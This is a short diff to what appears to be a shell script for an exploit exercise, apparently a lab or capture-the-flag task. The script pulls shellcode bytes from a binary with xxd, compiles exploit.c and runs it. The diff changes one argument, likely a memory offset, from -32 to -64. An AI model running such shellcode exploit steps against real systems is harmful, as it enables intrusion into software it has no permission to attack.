@@ -18,4 +18,4 @@
 
 xxd -s0x78 -l48 -c100 -p shellcode shellcode_hex
 gcc exploit.c -o exploit
-./exploit 80 -32 20
+./exploit 80 -64 20
